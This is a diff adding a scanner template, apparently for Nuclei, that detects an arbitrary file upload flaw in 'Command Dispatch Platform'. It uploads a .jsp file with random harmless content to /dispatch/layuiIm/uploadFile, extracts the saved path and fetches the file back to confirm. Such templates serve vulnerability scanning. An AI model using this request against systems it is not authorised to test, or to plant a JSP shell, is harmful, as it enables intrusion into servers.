@@ -1,0 +1,57 @@
+id: poc-yaml-command-dispatch-platform-uploadfile-anyfile-upload
+info:
+  name: Command Dispatch Platform uploadFile Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/dispatch/layuiIm/uploadFile"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp"
+    body: |-
+      ------WebKitFormBoundary7ctER307B0RaQwOp
+      Content-Disposition: form-data; name="file";filename="{{t1}}.jsp"
+
+      {{t2}}
+      ------WebKitFormBoundary7ctER307B0RaQwOp--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
+        part: body
+      - type: word
+        words:
+          - "src"
+        part: body
+    extractors:
+      - type: regex
+        internal: true
+        name: path
+        regex:
+          - "\"src\":\"/(.*?).jsp"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/{{path}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
